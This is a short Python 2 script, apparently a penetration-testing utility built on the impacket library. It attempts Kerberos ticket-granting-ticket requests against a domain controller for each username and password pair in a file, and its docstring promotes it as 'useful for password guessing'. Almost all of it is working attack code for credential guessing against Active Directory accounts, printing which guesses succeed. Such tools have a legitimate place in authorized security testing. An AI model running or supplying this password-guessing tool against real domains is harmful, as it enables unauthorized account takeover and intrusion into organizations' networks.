#!/usr/bin/env python2

'''
Alternative to smblogin2.py that uses kerberos to attempt to get a ticket granting ticket (TGT).
Should be faster than smblogin2.py but lacks admin share access check. Useful for password guessing:

    ./krblogin2.py -f userpass.txt <DC>

where userpass.txt has lines like these:
    DOMAIN\USER PASSWORD

Columns are separated by a single space. 2 spaces after USER would be interpreted as a password
with a leading space.
'''

from __future__ import print_function
import sys
import socket
import getpass
import argparse
import impacket
import collections
from binascii import unhexlify
from multiprocessing.dummy import Pool as ThreadPool

from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.constants import PrincipalNameType

def login(username, password, domain, dc, lmhash='', nthash=''):
    userp = Principal(username, type=PrincipalNameType.NT_PRINCIPAL.value)
    try:
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            userp, password, domain, unhexlify(lmhash), unhexlify(nthash), None, dc)
        print('{}\\{} "{}": Success'.format(domain, username, password))
    except KerberosError as e:
        print('{}\\{} "{}": Failure'.format(domain, username, password))
        #print(str(e))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', default='')
    pass_parser = parser.add_mutually_exclusive_group()
    pass_parser.add_argument('-p', '--password', default='')
    pass_parser.add_argument('-P', '--prompt', action='store_true', default='')
    #hash_group = parser.add_mutually_exclusive_group()
    #hash_group.add_argument('--nthash', action='store_true', default='', help='pass NT hash as password')
    #hash_group.add_argument('--lmhash', action='store_true', default='', help='pass LM hash as password')
    parser.add_argument('-d', '--domain', required=True)
    #parser.add_argument('-w', '--threads', type=int, default=1, help='default 1')
    parser.add_argument('-t', '--timeout', type=int, default=3, help='socket timeout. default 3s')
    parser.add_argument('-f', '--file', help='[domain\\]user pass file')
    parser.add_argument('kdc', help='kerberos server (DC)')
    args = parser.parse_args()

    if args.prompt:
        args.password = getpass.getpass()

    socket.setdefaulttimeout(args.timeout)
    work = collections.OrderedDict()
    if args.username:
        k = '{}\\{}'.format(args.domain, args.username).lower()
        work[k] = [args.domain, args.username, args.password]
    if args.file:
        for l in open(args.file):
            username = l.strip()
            domain = args.domain
            password = args.password
            if l.find(' ') > -1:
                username, password = l.strip().split(' ', 1)
            if username.find('\\') > -1:
                domain, username = username.split('\\')
            k = '{}\\{}'.format(domain, username).lower()
            work[k] = [domain, username, password]

    for d, u, p in work.values():
        login(u, p, d, args.kdc)
